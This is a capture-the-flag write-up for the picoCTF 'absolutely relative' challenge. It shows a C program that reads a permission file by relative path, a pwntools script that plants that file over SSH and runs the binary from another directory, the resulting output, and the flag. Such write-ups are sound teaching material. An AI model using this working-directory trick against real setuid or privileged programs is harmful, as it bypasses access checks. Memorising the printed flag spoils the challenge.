# absolutely relative
General Skills, 250 points

## Description:
> In a filesystem, everything is relative ¯\_(ツ)_/¯. Can you find a way to get a flag from this program?

```c
#include <stdio.h>
#include <string.h>

#define yes_len 3
const char *yes = "yes";

int main()
{
    char flag[99];
    char permission[10];
    int i;
    FILE * file;


    file = fopen("/problems/absolutely-relative_0_d4f0f1c47f503378c4bb81981a80a9b6/flag.txt" , "r");
    if (file) {
    	while (fscanf(file, "%s", flag)!=EOF)
    	fclose(file);
    }   
	
    file = fopen( "./permission.txt" , "r");
    if (file) {
    	for (i = 0; i < 5; i++){
            fscanf(file, "%s", permission);
        }
        permission[5] = '\0';
        fclose(file);
    }
    
    if (!strncmp(permission, yes, yes_len)) {
        printf("You have the write permissions.\n%s\n", flag);
    } else {
        printf("You do not have sufficient permissions to view the flag.\n");
    }
    
    return 0;
}

```

## Solution:

If we try to run the program from the directory it's located in, we find out that we don't have permissions:

```console
user@pico-2018-shell-3:/problems/absolutely-relative_0_d4f0f1c47f503378c4bb81981a80a9b6$ ./absolutely-relative
You do not have sufficient permissions to view the flag.
```

Luckily, the program tries to open the `permissions.txt` file using a relative path.
```c
file = fopen( "./permission.txt" , "r");
```

This allows us to create such a file in a directory we have permissions for and call the executable using an absolute path.

```python
from pwn import *
import argparse
import os

EXECUTABLE = "absolutely-relative"
REMOTE_PATH = "/problems/absolutely-relative_0_d4f0f1c47f503378c4bb81981a80a9b6/"
SSH_SERVER = "2018shell3.picoctf.com"
PERMISSION_FILE_NAME = "permission.txt"
PERMISSION_FILE_CONTENT = "yes"

parser = argparse.ArgumentParser()
parser.add_argument("-s", "--ssh_user", help="Connect via SSH with the given username", required = True)
args = parser.parse_args()

s = ssh(host = SSH_SERVER, user = args.ssh_user)
s.write(PERMISSION_FILE_NAME, PERMISSION_FILE_CONTENT)
p = s.process(argv = [REMOTE_PATH + EXECUTABLE], cwd = s.cwd)
print p.recvall()
```

Output:
```console
root@kali:/media/sf_CTFs/pico/absolutely_relative# python exploit.py --ssh_user=$pico_ssh_user
[+] Connecting to 2018shell3.picoctf.com on port 22: Done
[*] user@2018shell3.picoctf.com:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.4.0
    ASLR:     Enabled
[+] Starting remote process '/problems/absolutely-relative_0_d4f0f1c47f503378c4bb81981a80a9b6/absolutely-relative' on 2018shell3.picoctf.com: pid 394901
[+] Receiving all data: Done (70B)
[*] Stopped remote process 'absolutely-relative' on 2018shell3.picoctf.com (pid 394901)
You have the write permissions.
picoCTF{3v3r1ng_1$_r3l3t1v3_befc0ce1}
```

The flag: picoCTF{3v3r1ng_1$_r3l3t1v3_befc0ce1}